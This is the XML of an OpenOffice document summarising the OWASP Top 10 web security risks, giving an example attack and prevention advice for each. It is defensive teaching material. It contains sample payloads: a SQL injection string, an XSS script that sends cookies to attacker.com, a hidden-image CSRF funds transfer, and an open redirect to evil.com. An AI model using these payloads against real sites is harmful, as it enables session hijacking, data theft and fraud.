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list-style-name="L8">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5" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L11">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6" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L15">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18">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style:font-size-asian="12.25pt" style:font-size-complex="14pt"/>
    </style:style>
    <style:style style:name="P11" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L2">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties fo:font-size="14pt" style:text-underline-style="none" style:font-size-asian="12.25pt" style:font-size-complex="14pt"/>
    </style:style>
    <style:style style:name="P12" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L3">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties fo:font-size="14pt" style:text-underline-style="none" style:font-size-asian="12.25pt" style:font-size-complex="14pt"/>
    </style:style>
    <style:style style:name="P13" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L4">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties fo:font-size="14pt" style:text-underline-style="none" style:font-size-asian="12.25pt" style:font-size-complex="14pt"/>
    </style:style>
    <style:style style:name="P14"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5" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L6">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6" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L9">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7" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L10">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8" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L12">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19" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L14">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1" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L17">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4" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L1">
      <style:paragraph-properties fo:text-align="start"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6" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L3">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list-style-name="L5">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Standard" style:list-style-name="L7">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list-style-name="L13">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list-style-name="L16">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Application security.</text:p>
      <text:p text:style-name="P1"/>
      <text:list xml:id="list720070107" text:style-name="L1">
        <text:list-item>
          <text:p text:style-name="P24">Injection</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P10">Example Attack Scenario References</text:p>
      <text:p text:style-name="P10">The application uses untrusted data in the construction of the OWASP</text:p>
      <text:p text:style-name="P10">following vulnerable SQL call: </text:p>
      <text:p text:style-name="P10">Checking the code is a fast and accurate way to see if the application uses interpreters safely. Code analysis tools can help a security analyst find the use of interpreters and trace the data flow through the application. Manual penetration testers can confirm these issues by crafting exploits that confirm the vulnerability.</text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P10">String query = "SELECT * FROM accounts WHERE custID='" + request.getParameter("id") +"'";</text:p>
      <text:p text:style-name="P10">The attacker modifies the ‘id’ parameter in their browser to send: ' or '1'='1. This changes the meaning of the query to return all the records from the accounts database, instead of only the intended customer’s. </text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P10">http://example.com/app/accountView?id=' or '1'='1</text:p>
      <text:p text:style-name="P10">In the worst case, the attacker uses this weakness to invoke special stored procedures in the database, allowing a complete takeover of the database host.</text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P3">How Do I Prevent Injection?</text:p>
      <text:p text:style-name="P10">Preventing injection requires keeping untrusted data</text:p>
      <text:p text:style-name="P10">separate from commands and queries.</text:p>
      <text:p text:style-name="P10">1. The preferred option is to use a safe API which avoids the <text:s text:c="2"/>use of the interpreter entirely or provides a <text:s/>parameterized interface. Beware of APIs, such as stored</text:p>
      <text:p text:style-name="P10">procedures, that appear parameterized, but may still allow injection under the hood.</text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P10">2. If a parameterized API is not available, you should <text:s text:c="2"/>carefully escape special characters using the specific <text:s/>escape syntax for that interpreter. OWASP’s ESAPI has</text:p>
      <text:p text:style-name="P10"><text:s text:c="2"/>some of these escaping routines.</text:p>
      <text:p text:style-name="P10"></text:p>
      <text:list xml:id="list209989619" text:style-name="L2">
        <text:list-item>
          <text:p text:style-name="P11">Positive or “whitelist” input validation with appropriate <text:s text:c="3"/>canonicalization also helps protect against injection, but <text:s text:c="2"/>is not a complete defense as many applications require <text:s/>special characters in their input. OWASP’s ESAPI has an extensible library of white list input validation routines.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P10"/>
      <text:list xml:id="list697025254" text:style-name="L3">
        <text:list-item>
          <text:p text:style-name="P26">Cross site scripting (XSS)</text:p>
          <text:p text:style-name="P12"/>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P10"><text:soft-page-break/>Example Attack Scenario </text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P10">The application uses untrusted data in the construction of the  following HTML snippet without validation or escaping:  </text:p>
      <text:p text:style-name="P10">(String) page += "&lt;input name='creditcard' type='TEXT‘</text:p>
      <text:p text:style-name="P10">value='" + request.getParameter("CC") + "'&gt;";</text:p>
      <text:p text:style-name="P10">The attacker modifies the ‘CC’ parameter in their browser to:</text:p>
      <text:p text:style-name="P10">'&gt;&lt;script&gt;document.location=</text:p>
      <text:p text:style-name="P10">'http://www.attacker.com/cgi-bin/cookie.cgi?</text:p>
      <text:p text:style-name="P10">'%20+document.cookie&lt;/script&gt;.</text:p>
      <text:p text:style-name="P10">This causes the victim’s session ID to be sent to the attacker’s website, allowing the attacker to hijack the user’s current session. Note that attackers can also use XSS to defeat any CSRF defense the application might employ. See A5 for info on CSRF.</text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P3">How Do I Prevent XSS?</text:p>
      <text:p text:style-name="P10">Preventing XSS requires keeping untrusted data separate</text:p>
      <text:p text:style-name="P10">from active browser content.</text:p>
      <text:p text:style-name="P10">1. The preferred option is to properly escape all untrusted <text:s text:c="2"/>data based on the HTML context (body, attribute, <text:s/>JavaScript, CSS, or URL) that the data will be placed into.</text:p>
      <text:p text:style-name="P10">Developers need to include this escaping in their applications unless their UI framework does this for them. See the OWASP XSS Prevention Cheat Sheet for</text:p>
      <text:p text:style-name="P10">more information about escaping.</text:p>
      <text:p text:style-name="P10"></text:p>
      <text:list xml:id="list1172897668" text:style-name="L4">
        <text:list-item>
          <text:p text:style-name="P13">Positive or “whitelist” input validation with appropriate <text:s/>canonicalization (decoding) also helps protect against <text:s/>XSS, but is not a complete defense as many applications <text:s/>require special characters in their input. Such validation should, as much as possible, decode any encoded input, and then validate the length, characters, format, and any business rules on that data before accepting the input.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P10"/>
      <text:list xml:id="list1203940283" text:style-name="L5">
        <text:list-item>
          <text:p text:style-name="P27">Broken authentication and session management.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P9">Example Attack Scenarios </text:p>
      <text:p text:style-name="P14">Scenario #1: Airline reservations application supports URL </text:p>
      <text:p text:style-name="P14">rewriting, putting session IDs in the URL: </text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14">http://example.com/sale/saleitems;jsessionid=</text:p>
      <text:p text:style-name="P14">2P0OC2JDPXM0OQSNDLPSKHCJUN2JV?dest=Hawaii</text:p>
      <text:p text:style-name="P14">An authenticated user of the site wants to let his friends know about the sale. He e-mails the above link without knowing he is also giving away his session ID. When his friends use the link they will use his session and credit card. </text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14">Scenario #2: Application’s timeouts aren’t set properly. User uses public computer to access site. Instead of selecting “logout” the user simply closes the browser window <text:soft-page-break/>and walks away. Attacker uses same browser an hour later, and browser is still authenticated.</text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14">Scenario #3: Site does not use SSL /TLS for all traffic. User accessing site has his wireless traffic sniffed by neighbor, exposing his user ID, password, and session ID.</text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14">The primary recommendation for an organization is to make</text:p>
      <text:p text:style-name="P14">available to developers a single set of strong authentication</text:p>
      <text:p text:style-name="P14">and session management controls.</text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P3">How Do I Prevent This?</text:p>
      <text:p text:style-name="P14">1. Such controls should strive to meet all the authentication and session management requirements defined in OWASP’s Application Security Verification Standard</text:p>
      <text:p text:style-name="P14"><text:s/>(ASVS) areas V2 (Authentication) and V3 (Session Management).</text:p>
      <text:p text:style-name="P14"/>
      <text:list xml:id="list2030757113" text:style-name="L6">
        <text:list-item>
          <text:p text:style-name="P15">These controls should have a simple interface for <text:s text:c="2"/>developers. Consider the ESAPI Authenticator and User <text:s/>APIs as good examples to follow, use, or build upon.</text:p>
          <text:p text:style-name="P15"/>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P14">3. Strong efforts should be made to avoid XSS flaws which</text:p>
      <text:p text:style-name="P14"><text:s text:c="2"/>can be used to steal session IDs. See A5.</text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14"/>
      <text:list xml:id="list1594228003" text:style-name="L7">
        <text:list-item>
          <text:p text:style-name="P28">Insecure direct object reference.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P22">Example Attack Scenario </text:p>
      <text:p text:style-name="P14">The application uses unverified data in a SQL call that is accessing account information: </text:p>
      <text:p text:style-name="P14">String query = "SELECT * FROM accts WHERE account = ?";</text:p>
      <text:p text:style-name="P14">PreparedStatement pstmt =connection.prepareStatement(query , ... );</text:p>
      <text:p text:style-name="P14">pstmt.setString( 1, request.getparameter("acct"));</text:p>
      <text:p text:style-name="P14">ResultSet results = pstmt.executeQuery( );</text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14">The attacker simply modifies the ‘acct’ parameter in their browser to send whatever account number they want. If not verified, the attacker can access any user’s account, instead of only the intended customer’s.</text:p>
      <text:p text:style-name="P14"><text:a xlink:type="simple" xlink:href="http://example.com/app/accountInfo?acct=notmyacct">http://example.com/app/accountInfo?acct=notmyacct</text:a></text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P22">How Do I Prevent This?</text:p>
      <text:p text:style-name="P14">Preventing insecure direct object references requires selecting an approach for protecting each user accessible object (e.g., object number, filename).</text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14"><text:soft-page-break/></text:p>
      <text:p text:style-name="P14">1. Use indirect object references. This prevents attackers from directly targeting unauthorized resources. For example, a drop down list of six resources could use the</text:p>
      <text:p text:style-name="P14">numbers 1 to 6 to indicate which value the user selected, instead of using the resource’s database key. The <text:s/>application has to map the per-user indirect reference</text:p>
      <text:p text:style-name="P14">back to the actual database key on the server. OWASP’s <text:s/>ESAPI includes both sequential and random access reference maps that developers can use to eliminate</text:p>
      <text:p text:style-name="P14">direct object references.</text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14">2. Check access. Each use of a direct object reference from <text:s text:c="2"/>an untrusted source must include an access control check <text:s/>that ensures the user is authorized for the requested</text:p>
      <text:p text:style-name="P14">object.</text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14"/>
      <text:list xml:id="list894076276" text:style-name="L8">
        <text:list-item>
          <text:p text:style-name="P4">Cross site request forgery</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P22">Example Attack Scenario </text:p>
      <text:p text:style-name="P14">The application allows a user to submit a state changing request that does not include anything secret. Like so: </text:p>
      <text:p text:style-name="P14">http://example.com/app/transferFunds?amount=1500</text:p>
      <text:p text:style-name="P14">&amp;destinationAccount=4673243243</text:p>
      <text:p text:style-name="P14">So, the attacker constructs a request that will transfer money from the victim’s account to their account, and then embeds this attack in an image request or iframe stored on various sites under the attacker’s control.</text:p>
      <text:p text:style-name="P14">&lt;img src="http://example.com/transferFunds?</text:p>
      <text:p text:style-name="P14">amount=1500&amp;destinationAccount=attackersAcct#“</text:p>
      <text:p text:style-name="P14">width="0" height="0" /&gt;</text:p>
      <text:p text:style-name="P14">If the victim visits any of these sites while already </text:p>
      <text:p text:style-name="P14">authenticated to example.com, any forged requests will include the user’s session info, inadvertently authorizing the</text:p>
      <text:p text:style-name="P14">request.</text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P22">How Do I Prevent CSRF?</text:p>
      <text:p text:style-name="P14">Preventing CSRF requires the inclusion of a unpredictable token as part of each transaction. Such tokens should at a minimum be unique per user session, but can also be unique per request.</text:p>
      <text:p text:style-name="P14"/>
      <text:list xml:id="list578791632" text:style-name="L9">
        <text:list-item>
          <text:p text:style-name="P16">The preferred option is to include the unique token in a <text:s text:c="2"/>hidden field. This causes the value to be sent in the body <text:s/>of the HTTP request, avoiding its inclusion in the URL, which is subject to exposure.</text:p>
          <text:p text:style-name="P16"/>
        </text:list-item>
      </text:list>
      <text:list xml:id="list2000957620" text:style-name="L10">
        <text:list-item>
          <text:p text:style-name="P17">The unique token can also be included in the URL itself, <text:s text:c="2"/>or a URL parameter. However, such placement runs the <text:s/>risk that the URL will be exposed to an attacker, thus compromising the secret token.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14"><text:soft-page-break/></text:p>
      <text:list xml:id="list569647522" text:style-name="L11">
        <text:list-item>
          <text:p text:style-name="P5">Security Misconfiguration</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P22">Example Attack Scenarios </text:p>
      <text:p text:style-name="P14">Scenario #1: Researcher finds a overlong UTF-8 vulnerability in your app server. Patch is released but you don’t apply it  <text:s/>quickly. Attacker reverse engineers latest patch, figures out  <text:s/>the flaw, scans the net for unpatched servers, and takes over </text:p>
      <text:p text:style-name="P14"><text:s text:c="2"/>your server. </text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14">Scenario #2: Admin console is automatically installed and not removed. Default accounts aren’t changed. Attacker discovers the standard admin pages are on your server, logs in with default passwords, and takes over. </text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14">Scenario #3: Directory listing is not disabled on your server. Attacker discovers he can find all files on your server by simply listing the directories. Attacker finds and downloads all your compiled Java classes, which he reverses to get all your custom code. He then find a serious access control flaw in your application.</text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P22">How Do I Prevent This?</text:p>
      <text:p text:style-name="P14">The primary recommendations are to establish:</text:p>
      <text:p text:style-name="P14"><text:s/></text:p>
      <text:p text:style-name="P14">1. A repeatable hardening process that makes it fast and easy to deploy another environment that is properly locked down. Dev, QA, and production environments</text:p>
      <text:p text:style-name="P14">should all be configured the same. This process should be automated to minimize the effort required to setup a new secure environment.</text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14">2. A process for keeping abreast of and deploying all new software updates and patches in a timely manner to each deployed environment.</text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14">3. A strong network architecture that provides good separation and security between components.</text:p>
      <text:p text:style-name="P14"/>
      <text:list xml:id="list1109309588" text:style-name="L12">
        <text:list-item>
          <text:p text:style-name="P18">Consider running automated scans periodically to help you detect future misconfigurations or missing patches.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14"/>
      <text:list xml:id="list1518455710" text:style-name="L13">
        <text:list-item>
          <text:p text:style-name="P29">Failure to restrict URL access.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P25">Example Attack Scenario </text:p>
      <text:p text:style-name="P20">The attacker simply force browses to target URLs. Consider </text:p>
      <text:p text:style-name="P20">the following URLs which are both supposed to require </text:p>
      <text:p text:style-name="P20">authentication, and admin rights are also required for access </text:p>
      <text:p text:style-name="P20">to the “admin_getappInfo” page. </text:p>
      <text:p text:style-name="P20"/>
      <text:p text:style-name="P31">http://example.com/app/getappInfo </text:p>
      <text:p text:style-name="P31"><text:soft-page-break/>http://example.com/app/admin_getappInfo </text:p>
      <text:p text:style-name="P14">If the attacker is not authenticated, and access to eith</text:p>
      <text:p text:style-name="P14">er page •OWASP Article on Forced Browsing</text:p>
      <text:p text:style-name="P14">is granted, then unauthorized access was allowed. If an </text:p>
      <text:p text:style-name="P14">authenticated, non-admin, user is allowed to access the </text:p>
      <text:p text:style-name="P14">“admin_getappInfo” page, this is a flaw, and may lead the </text:p>
      <text:p text:style-name="P14"><text:s text:c="4"/>attacker to more improperly protected admin pages. </text:p>
      <text:p text:style-name="P14">Such flaws are frequently introduced when links and buttons </text:p>
      <text:p text:style-name="P14">are simply not displayed to unauthorized users, but the </text:p>
      <text:p text:style-name="P14">application fails to protect the pages they target. </text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14">How Do I Prevent This?</text:p>
      <text:p text:style-name="P14">Preventing unauthorized URL access requires selecting an</text:p>
      <text:p text:style-name="P14">approach for requiring proper authentication and proper</text:p>
      <text:p text:style-name="P14">authorization for each page. Frequently, such protection is</text:p>
      <text:p text:style-name="P14">provided by one or more components external to the</text:p>
      <text:p text:style-name="P14">application code. Regardless of the mechanism(s), it is</text:p>
      <text:p text:style-name="P14">recommended that:</text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14">1. The authentication and authorization policies be role based, to minimize the effort required to maintain these policies.</text:p>
      <text:p text:style-name="P14">2. The policies should be highly configurable, in order to minimize any hard coded aspects of the policy.</text:p>
      <text:p text:style-name="P14">3. The enforcement mechanism(s) should deny all access by <text:s text:c="2"/>default, requiring explicit grants to specific users and <text:s/>roles for access to every page.</text:p>
      <text:list xml:id="list1114319651" text:style-name="L14">
        <text:list-item>
          <text:p text:style-name="P19">If the page is involved in a workflow, check to make sure <text:s text:c="2"/>the conditions are in the proper state to allow access.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14"/>
      <text:list xml:id="list872101366" text:style-name="L15">
        <text:list-item>
          <text:p text:style-name="P6">Unvalidated redirects and forwards</text:p>
          <text:p text:style-name="P6"/>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P3">Example Attack Scenarios </text:p>
      <text:p text:style-name="P14">Scenario #1: The application has a page called “redirect.jsp” </text:p>
      <text:p text:style-name="P14"><text:s text:c="4"/>which takes a single parameter named “url”. The attacker </text:p>
      <text:p text:style-name="P14"><text:s text:c="8"/>crafts a malicious URL that redirects users to a malicious site </text:p>
      <text:p text:style-name="P14"><text:s text:c="8"/>that performs phishing and installs malware. </text:p>
      <text:p text:style-name="P14"><text:a xlink:type="simple" xlink:href="http://www.example.com/redirect.jsp?url=evil.com"/></text:p>
      <text:p text:style-name="P14"><text:a xlink:type="simple" xlink:href="http://www.example.com/redirect.jsp?url=evil.com">http://www.example.com/redirect.jsp?url=evil.com</text:a></text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14">Scenario #2:The application uses forward to route requests</text:p>
      <text:p text:style-name="P14">between different parts of the site. To facilitate this, some</text:p>
      <text:p text:style-name="P14">pages use a parameter to indicate where the user should be</text:p>
      <text:p text:style-name="P14">sent if a transaction is successful. In this case, the attacker</text:p>
      <text:p text:style-name="P14"><text:soft-page-break/>crafts a URL that will pass the applications access control</text:p>
      <text:p text:style-name="P14">check and then forward him to an administrative function</text:p>
      <text:p text:style-name="P14">that he would not normally be able to access.</text:p>
      <text:p text:style-name="P14"><text:a xlink:type="simple" xlink:href="http://www.example.com/boring.jsp?fwd=admin.jsp">http://www.example.com/boring.jsp?fwd=admin.jsp</text:a></text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P22">How Do I Prevent This?</text:p>
      <text:p text:style-name="P14">Safe use of redirects and forwards can be done in a number</text:p>
      <text:p text:style-name="P14">of ways.</text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14">1. Imply avoid using redirects and forwards.</text:p>
      <text:p text:style-name="P14">2. If used, don’t involve user parameters in calculating the</text:p>
      <text:p text:style-name="P14"><text:s text:c="4"/>destination. This can usually be done.</text:p>
      <text:p text:style-name="P14">3. If destination parameters can’t be avoided, ensure that</text:p>
      <text:p text:style-name="P14"><text:s text:c="4"/>the supplied value is valid, and authorized for the user.</text:p>
      <text:p text:style-name="P14">4. Applications can use ESAPI to override the sendRedirect()</text:p>
      <text:p text:style-name="P14"><text:s text:c="2"/>method to make sure all redirect destinations are safe.</text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14"/>
      <text:list xml:id="list772987407" text:style-name="L16">
        <text:list-item>
          <text:p text:style-name="P30">Insecure cryptographic storage.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P25"/>
      <text:p text:style-name="P20">Scenario #1: An application encrypts credit cards in a OWASP database to prevent exposure to end users. However, the database is set to automatically decrypt queries against the  credit card columns, allowing a SQL injection flaw to retrieve </text:p>
      <text:p text:style-name="P20">all the credit cards in cleartext (the system should have been configured to allow only back end applications to decrypt them, not the front end web application). </text:p>
      <text:p text:style-name="P20"/>
      <text:p text:style-name="P20">Scenario #2: A backup tape is made of encrypted health records, but the encryption key is on the same backup. The tape never arrives at the backup center.</text:p>
      <text:p text:style-name="P20"/>
      <text:p text:style-name="P20">Scenario #3: The password database uses unsalted hashes to store everyone’s passwords. A file upload flaw allows an attacker to retrieve the password file. All the unsalted hashes can be brute forced in 4 weeks, while salted hashes would</text:p>
      <text:p text:style-name="P20">have taken over 3000 years.</text:p>
      <text:p text:style-name="P20"/>
      <text:p text:style-name="P20"/>
      <text:p text:style-name="P7">How Do I Prevent This?</text:p>
      <text:p text:style-name="P20">The full perils of unsafe cryptography are well beyond the scope of this Top 10. That said, for all sensitive data deserving encryption, do the following, at a minimum:</text:p>
      <text:p text:style-name="P20">1. Considering the threats you plan to protect this data <text:s text:c="2"/>from (e.g., insider attack, external user), make sure you <text:s/>encrypt all such data at rest in a manner that defends</text:p>
      <text:p text:style-name="P20">against these threats.</text:p>
      <text:p text:style-name="P20">2. Ensure offsite backups are encrypted, but the keys are <text:s text:c="2"/>managed and backed up separately.</text:p>
      <text:p text:style-name="P20"><text:soft-page-break/>3. Ensure appropriate strong standard algorithms and <text:s text:c="2"/>strong keys are used, and key management is in place.</text:p>
      <text:p text:style-name="P20">4. Ensure passwords are hashed with a strong standard algorithm and an appropriate salt is used.</text:p>
      <text:list xml:id="list1689599521" text:style-name="L17">
        <text:list-item>
          <text:p text:style-name="P21">Ensure all keys and passwords are protected from <text:s text:c="2"/>unauthorized access.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P20"/>
      <text:p text:style-name="P20"/>
      <text:list xml:id="list142275960" text:style-name="L18">
        <text:list-item>
          <text:p text:style-name="P8">Insufficient transport layer protection.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P20"/>
      <text:p text:style-name="P20">Example Attack Scenarios </text:p>
      <text:p text:style-name="P20"/>
      <text:p text:style-name="P20">Scenario #1: The site simply doesn’t use SSL for all pages that  <text:s/>require authentication. Attacker simply monitors network  <text:s/>traffic (like an open wireless or their neighborhood cable  <text:s/>modem network), and observes an authenticated victim’s </text:p>
      <text:p text:style-name="P20"><text:s text:c="4"/>session cookie. Attacker then replays this cookie and takes  <text:s text:c="3"/>over the user’s session. </text:p>
      <text:p text:style-name="P20"/>
      <text:p text:style-name="P20">Scenario #2: Site has improperly configured SSL certificate which causes browser warnings for its users. Users have to accept such warnings and continue, in order to use the site. This causes users to get accustomed to such warnings. Phishing attack against site’s customers lures them to a  <text:s/>lookalike site which doesn’t have valid certificate generating similar browser warnings. Since victims are accustomed to </text:p>
      <text:p text:style-name="P20"><text:s text:c="4"/>such warnings, they proceed on and use the phishing site, giving away passwords or other private data. </text:p>
      <text:p text:style-name="P20"/>
      <text:p text:style-name="P23">How Do I Prevent This?</text:p>
      <text:p text:style-name="P23"/>
      <text:p text:style-name="P20">Providing proper transport layer protection can affect the site</text:p>
      <text:p text:style-name="P20">design. It’s easiest to require SSL for the entire site. For</text:p>
      <text:p text:style-name="P20"><text:s/>performance reasons, some sites use SSL only on private</text:p>
      <text:p text:style-name="P20">pages. Others use SSL only on ‘critical’ pages, but this can</text:p>
      <text:p text:style-name="P20"><text:s text:c="3"/>expose session IDs and other sensitive data.</text:p>
      <text:p text:style-name="P20"/>
      <text:p text:style-name="P20">1. Require SSL for all selected pages. Non-SSL requests to</text:p>
      <text:p text:style-name="P20"><text:s text:c="2"/>these pages should be redirected to the SSL page.</text:p>
      <text:p text:style-name="P20">2. Set the ‘secure’ flag on all sensitive cookies.</text:p>
      <text:p text:style-name="P20">3. Configure your SSL/TLS provider to only support strong</text:p>
      <text:p text:style-name="P20"><text:s text:c="2"/>(FIPS 140-2 compliant) algorithms.</text:p>
      <text:p text:style-name="P20">4. Ensure your certificate is valid, not expired, not revoked,</text:p>
      <text:p text:style-name="P20"><text:s text:c="2"/>and matches all domains used by the site.</text:p>
      <text:p text:style-name="P20">5. Backend and other connections should also use SSL/TLS</text:p>
      <text:p text:style-name="P20"><text:s text:c="2"/>or other encryption technolog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siruddin Shaikh</meta:initial-creator>
    <meta:creation-date>2012-09-17T11:06:03</meta:creation-date>
    <meta:generator>OpenOffice.org/3.2$Linux OpenOffice.org_project/320m12$Build-9483</meta:generator>
    <dc:date>2012-09-17T14:50:33</dc:date>
    <dc:creator>Nasiruddin Shaikh</dc:creator>
    <meta:editing-duration>PT03H44M30S</meta:editing-duration>
    <meta:editing-cycles>137</meta:editing-cycles>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="8" meta:paragraph-count="190" meta:word-count="2391" meta:character-count="15905"/>
  </office:meta>
</office:document-meta>
</file>